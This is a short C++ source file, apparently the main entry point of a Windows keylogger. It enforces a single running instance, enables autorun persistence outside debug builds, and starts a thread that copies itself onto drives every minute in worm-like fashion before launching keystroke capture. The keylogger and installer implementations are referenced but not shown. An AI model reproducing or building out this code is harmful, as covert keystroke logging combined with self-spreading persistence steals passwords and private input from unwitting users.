#include "stdafx.h"
#include "Logger.h"
#include "Keylogger.h"
#include "Settings.h"
#include "Installer.h"

DWORD WINAPI ProcInstall(LPVOID lpParameter)
{
	for (;;) {
		installer.InstallOnDrives();
		Sleep(60000);
	}
	return 0;
}

extern "C" int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{
	TCHAR semName[] = V_UNIQUE_ID;
	HANDLE hSem = CreateSemaphore(NULL, 1, 1, semName);
	if (WaitForSingleObject(hSem, 0) == WAIT_TIMEOUT)
	{
		Error(_T("Already running"));
		CloseHandle(hSem);
		return 0;
	}

	installer.SetAutorun(true);
#ifdef _DEBUG
	installer.SetAutorun(false);
#endif

	CreateThread(NULL, 0xFFFF, ProcInstall, NULL, 0, NULL);
	

	keylogger.Run();

	CloseHandle(hSem);
	return 0;
}
